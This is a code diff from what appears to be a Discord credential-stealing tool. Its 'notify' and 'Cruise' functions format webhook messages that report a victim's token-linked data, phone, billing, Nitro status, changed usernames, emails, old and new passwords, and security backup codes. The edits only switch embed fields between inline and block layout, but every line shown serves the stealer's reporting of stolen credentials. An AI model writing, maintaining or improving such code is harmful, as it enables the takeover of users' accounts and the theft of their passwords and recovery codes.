@@ -266,10 +266,10 @@ const notify = async (ctx, token, user) => {
 
     ctx.embeds[0].fields.push(
         // { name: "\u200b", value: "\u200b", inline: false },
-        { name: "Nitro", value: `\`${nitro}\``, inline: false },
+        { name: "Nitro", value: `\`${nitro}\``, inline: true },
         { name: "Phone", value: `\`${user.phone}\`` ? `\`${user.phone}\`` : 'x', inline: true },
         // { name: "\u200b", value: "\u200b", inline: false },
-        { name: "Badges", value: `\`${badges}\``, inline: false },
+        { name: "Badges", value: `\`${badges}\``, inline: true },
         { name: "Billing", value: `\`${billing}\``, inline: true },
         // { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
     );
@@ -631,7 +631,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `${user.username}`,
                 embeds: [{
                     fields: [
-                        { name: "New Username", value: `\`${request.username}\``, inline: false },
+                        { name: "New Username", value: `\`${request.username}\``, inline: true },
                         { name: "Password", value: `\`${request.password}\``, inline: true },
                         { name: "Email", value: `\`${email}\``, inline: false },
                     ],
@@ -646,7 +646,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `${user.username}`,
                 embeds: [{
                     fields: [
-                        { name: "New Email", value: `\`${email}\``, inline: false },
+                        { name: "New Email", value: `\`${email}\``, inline: true },
                         { name: "Password", value: `\`${password}\``, inline: true },
                     ],
                 }],
@@ -660,7 +660,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `${user.username}`,
                 embeds: [{
                     fields: [
-                        { name: "New Password", value: `\`${request.new_password}\``, inline: false, },
+                        { name: "New Password", value: `\`${request.new_password}\``, inline: true, },
                         { name: "Old Password", value: `\`${request.password}\``, inline: true, },
                         { name: "Email", value: `\`${email}\``, inline: false, },
                     ],
@@ -678,7 +678,7 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `${user.username}`,
                 embeds: [{
                     fields: [
-                        { name: "Password", value: `\`${password}\``, inline: false },
+                        { name: "Password", value: `\`${password}\``, inline: true },
                         { name: "Email", value: `\`${email}\``, inline: true },
                         // { name: "\u200b", value: "\u200b", inline: false },
                         { name: "Security codes", value: `\`\n${codes}\``, inline: false },
